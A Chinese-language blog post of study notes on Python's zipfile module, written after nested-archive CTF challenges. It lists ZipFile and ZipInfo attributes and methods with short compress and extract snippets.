    <url>/2022/09/18/python-zipfile/</url>
    
    <content type="html"><![CDATA[<h2 id="python-Zipfile库"><a href="#python-Zipfile库" class="headerlink" title="python_Zipfile库"></a>python_Zipfile库</h2><p>因为近期nepCTF2022和练习都碰到了压缩包套娃的题目，写了两个脚本，在这里记录一下zipfile的学习。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>标准库zipfile，可以用来处理压缩文件。<br>zipfile是一个用来压缩文件和解压缩文件的模块，它有两个常用的类，分别是ZipFile和ZipInfo。<br>其中ZipFile是主要的类，用来创建和读取zip文件，而ZipInfo是存储的zip文件的每个文件的信息的。</p><h2 id="ZipFile对象"><a href="#ZipFile对象" class="headerlink" title="ZipFile对象"></a>ZipFile对象</h2><p>ZipFile 对象在概念上与 File 对象相似。<br><strong>官方文档定义：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">打开一个 ZIP 文件，file 为一个指向文件的路径（字符串），一个类文件对象或者一个 path-like <span class="hljs-built_in">object</span>。<br>形参 mode 应当为 <span class="hljs-string">&#x27;r&#x27;</span> 来读取一个存在的文件，<span class="hljs-string">&#x27;w&#x27;</span> 来截断并写入新的文件， <span class="hljs-string">&#x27;a&#x27;</span> 来添加到一个存在的文件，<br>或者 <span class="hljs-string">&#x27;x&#x27;</span> 来仅新建并写入新的文件。如果 mode 为 <span class="hljs-string">&#x27;x&#x27;</span> 并且 file 指向已经存在的文件，<br>则抛出 FileExistsError。如果 mode 为 <span class="hljs-string">&#x27;a&#x27;</span> 且 file 为已存在的文件，则格外的文件将被加入。<br>如果 file 不指向 ZIP 文件，之后一个新的 ZIP 归档将被追加为此文件。<br>这是为了将 ZIP 归档添加到另一个文件（例如 python.exe）。<br>如果 mode 为 <span class="hljs-string">&#x27;a&#x27;</span> 并且文件不存在， 则会新建。如果 mode 为 <span class="hljs-string">&#x27;r&#x27;</span> 或 <span class="hljs-string">&#x27;a&#x27;</span>， 则文件应当可定位。<br></code></pre></td></tr></table></figure><h2 id="ZipInfo对象"><a href="#ZipInfo对象" class="headerlink" title="ZipInfo对象"></a>ZipInfo对象</h2><p><strong>通过ZipFile的getinfo方法得到ZipInfo对象。</strong></p><p>ZipFile.getinfo(name) 方法返回的是一个ZipInfo对象，表示zip文档中相应文件的信息。它支持如下属性：</p><p>ZipInfo.filename： 获取文件名称。</p><p>ZipInfo.date_time： 获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</p><p>ZipInfo.compress_type： 压缩类型。</p><p>ZipInfo.comment： 文档说明。</p><p>ZipInfo.extr： 扩展项数据。</p><p>ZipInfo.create_system： 获取创建该zip文档的系统。</p><p>ZipInfo.create_version： 获取 创建zip文档的PKZIP版本。</p><p>ZipInfo.extract_version： 获取 解压zip文档所需的PKZIP版本。</p><p>ZipInfo.reserved： 预留字段，当前实现总是返回0。</p><p>ZipInfo.flag_bits： zip标志位。</p><p>ZipInfo.volume： 文件头的卷标。</p><p>ZipInfo.internal_attr： 内部属性。</p><p>ZipInfo.external_attr： 外部属性。</p><p>ZipInfo.header_offset： 文件头偏移位。</p><p>ZipInfo.CRC： 未压缩文件的CRC-32。</p><p>ZipInfo.compress_size： 获取压缩后的大小。</p><p>ZipInfo.file_size： 获取未压缩的文件大小。<br>ZipInfo相关属性</p><p>ZipInfo.filename        获取文件名称。</p><p>ZipInfo.date_time       获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</p><p>ZipInfo.compress_type   压缩类型。</p><p>ZipInfo.comment         文档说明。</p><p>ZipInfo.extr            扩展项数据。</p><p>ZipInfo.create_system   获取创建该zip文档的系统。</p><p>ZipInfo.create_version  获取、创建zip文档的PKZIP版本。</p><p>ZipInfo.extract_versio  获取、解压zip文档所需的PKZIP版本。</p><p>ZipInfo.reserved        预留字段，当前实现总是返回0。</p><p>ZipInfo.flag_bits       zip标志位。</p><p>ZipInfo.volume          文件头的卷标。</p><p>ZipInfo.internal_attr   内部属性。</p><p>ZipInfo.external_attr   外部属性。</p><p>ZipInfo.header_offset   文件头偏移位。</p><p>ZipInfo.CRC             未压缩文件的CRC-32。</p><p>ZipInfo.compress_size   获取压缩后的大小。</p><p>ZipInfo.file_size       获取未压缩的文件大小</p><h2 id="1-创建一个-ZipFile-对象"><a href="#1-创建一个-ZipFile-对象" class="headerlink" title="1.创建一个 ZipFile 对象"></a>1.创建一个 ZipFile 对象</h2><p>要创建一个 ZipFile对象，就调用 zipfile.ZipFile()函数，向它传入一个字符串，表示.zip文件的文件名。请注意，zipfile 是 Python 模块的名称，ZipFile()是函数的名称。ZipFile 的构造方法有两个参数，第一个参数是必选参数，接受一个字符串格式的压缩包名称，第二个参数为<strong>可选</strong>参数，表示打开模式，类似于文件操作，有r&#x2F;w&#x2F;a三种模式，分别代表读、写、添加，默认为r，即读模式。压缩使用w，解压缩使用r。</p><p>mode可以省略<br>压缩需要把mode改为‘w’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile=zipfile.ZipFile(<span class="hljs-string">&quot;test.zip&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br></code></pre></td></tr></table></figure><p>解压需要把mode改为‘r’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile=zipfile.ZipFile(<span class="hljs-string">&quot;test.zip&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="2-添加压缩文件-or-选择解压文件"><a href="#2-添加压缩文件-or-选择解压文件" class="headerlink" title="2.添加压缩文件 or 选择解压文件"></a>2.添加压缩文件 or 选择解压文件</h2><h3 id="需要使用的方法"><a href="#需要使用的方法" class="headerlink" title="需要使用的方法"></a>需要使用的方法</h3><p> ZipFile.extract(member, path&#x3D;None, pwd&#x3D;None)¶</p><pre><code class="hljs">从归档中提取出一个成员放入当前工作目录；member 必须为成员的完整名称或 ZipInfo 对象。成员的文件信息会尽可能精确地被提取。 path 指定一个要提取到的不同目录。member 可以是一个文件名或 ZipInfo 对象。 pwd 是用于解密文件的密码。</code></pre><p> ZipFile.extractall(path&#x3D;None, members&#x3D;None, pwd&#x3D;None)</p><pre><code class="hljs">从归档中提取出所有成员放入当前工作目录。 path 指定一个要提取到的不同目录。members 为可选项且必须为 namelist() 所返回列表的一个子集。 pwd 是用于解密文件的密码。</code></pre><p> ZipFile.write(filename, arcname&#x3D;None, compress_type&#x3D;None, compresslevel&#x3D;None)</p><pre><code class="hljs">将名为 filename 的文件写入归档，给予的归档名为 arcname (默认情况下将与 filename 一致，但是不带驱动器盘符并会移除开头的路径分隔符)。 compress_type 如果给出，它将覆盖作为构造器 compression 形参对于新条目所给出的值。类似地，compresslevel 如果给出也将覆盖构造器。 归档必须使用 &#39;w&#39;, &#39;x&#39; 或 &#39;a&#39; 模式打开。</code></pre><p>第二个参数是“压缩类型”参数，它告诉计算机使用怎样的算法来压缩文件。可以总是将这个值设置为zipfile.ZIP_DEFLATED（这指定了 deflate 压缩算法，它对各种类型的数据都很有效）。</p><p>ZipFile.close()</p><pre><code class="hljs">关闭归档文件。 你必须在退出程序之前调用 close() 否则将不会写入关键记录数据。</code></pre><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>写入压缩文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile.write(<span class="hljs-string">r&quot;../test.py&quot;</span>)<br>zfile.close()//关闭对象<br></code></pre></td></tr></table></figure><p>解压文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile.extractall()//解压所有文件<br>zfile.extract(<span class="hljs-string">r&quot;test.py&quot;</span>)//解压指定文件<br>zfile.close()//关闭对象<br></code></pre></td></tr></table></figure><h2 id="3-其他常见方法"><a href="#3-其他常见方法" class="headerlink" title="3.其他常见方法"></a>3.其他常见方法</h2><p>ZipFile.getinfo(name)</p><pre><code class="hljs">返回一个 ZipInfo 对象，其中包含有关归档成员 name 的信息。 针对一个目前并不包含于归档中的名称调用 getinfo() 将会引发 KeyError。</code></pre><p>ZipFile.infolist()</p><pre><code class="hljs">返回一个列表，其中包含每个归档成员的 ZipInfo 对象。 如果是打开一个现有归档则这些对象的排列顺序与它们对应条目在磁盘上的实际 ZIP 文件中的顺序一致。</code></pre><p>ZipFile.namelist()</p><pre><code class="hljs">返回按名称排序的归档成员列表（也就是压缩包里的文件名）。</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://docs.python.org/zh-cn/3/library/zipfile.html#zipfile.ZIP_BZIP2">https://docs.python.org/zh-cn/3/library/zipfile.html#zipfile.ZIP_BZIP2</a></p><p><a href="https://www.cnblogs.com/wangylblog/p/13925894.html">https://www.cnblogs.com/wangylblog/p/13925894.html</a></p><p><a href="https://blog.csdn.net/sinat_38682860/article/details/114176182">https://blog.csdn.net/sinat_38682860/article/details/114176182</a></p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>脚本</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
